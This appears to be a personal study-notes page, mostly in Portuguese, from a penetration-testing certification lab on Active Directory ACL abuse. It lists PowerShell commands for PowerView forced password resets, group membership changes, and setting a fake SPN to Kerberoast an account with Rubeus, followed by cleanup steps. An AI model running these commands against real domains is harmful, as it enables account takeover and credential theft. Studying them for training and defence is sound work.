> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/acl-abuse-tactics.md).

# ACL Abuse Tactics

* **Criando um objeto PSCredential**

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

* **Criando um objeto SecureString**

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

* **Alterando a senha do usuário**

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

```

* **Criando um objeto SecureString usando damundsen**

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

* **Adicionando damundsen ao grupo de nível 1 do Help Desk**

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

* **Confirmando que damundsen foi adicionado ao grupo**

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

* **Criando um SPN falso**

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

* **Kerberoasting with Rubeus**

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

### Limpeza

* **Removendo o SPN falso da conta de adunn**

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

* **Removendo damundsen do grupo de nível 1 do Help Desk**

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
